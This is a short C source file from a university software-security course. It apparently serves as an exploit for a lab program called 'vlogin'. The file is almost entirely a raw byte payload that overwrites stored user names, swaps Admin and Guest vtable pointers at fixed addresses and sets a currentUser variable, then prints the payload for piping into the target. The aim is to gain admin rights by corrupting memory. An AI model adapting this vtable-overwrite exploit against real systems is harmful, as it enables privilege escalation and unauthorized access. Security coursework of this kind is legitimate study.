/*
 * Payload injector for vlogin
 *
 * Simon Greenblatt <scamposg@cs.brown.edu>
 * CSCI2951U: Advanced Topics in Software Security
 * 
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
"\x53\x69\x6d\x6f\x6e\x00\x00\x00"  // Simon name
"\xb0\xbe\x04\x08"                  // vtable for Admin
"\x61\x64\x6d\x69\x6e\x00\x00\x00"  // admin name
"\xa0\xbe\x04\x08"                  // vtable for Guest
"\x41\x6c\x69\x63\x65\x00\x00\x00"  // Alice name
"\xb0\xbe\x04\x08"                  // vtable for Admin
"\x77\x30\x30\x74\x00\x00\x00\x00"  // w00t name
"\xa0\xbe\x04\x08"                  // vtable for Guest
"\x43\x68\x61\x72\x6c\x69\x65\x00"  // Charlie name
"\x02\x00\x00\x00";                 // currentUser variable set to w00t

int main(int argc, char **argv) {
    write(STDOUT_FILENO, payload, sizeof(payload) - 1);
    return 0;
}